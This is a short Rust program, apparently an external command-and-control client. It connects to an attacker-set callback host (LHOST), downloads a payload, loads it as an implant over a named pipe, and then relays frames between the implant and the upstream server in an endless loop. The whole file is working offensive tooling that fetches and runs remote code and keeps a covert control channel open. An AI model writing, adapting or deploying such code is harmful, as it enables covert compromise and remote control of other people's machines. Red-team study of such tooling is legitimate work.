use covert_client::CSFrame;
use std::net::TcpStream;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut conn = TcpStream::connect(env!("LHOST", "Set LHOST for client callback"))?;
    let payload = conn.read_frame()?;
    let mut implant = covert_client::create_implant_from_buf(payload, "mypipe")?;
    loop {
        let from_implant = implant.read_frame()?;
        conn.write_frame(from_implant)?;
        let from_upstream = conn.read_frame()?;
        implant.write_frame(from_upstream)?;
    }
}
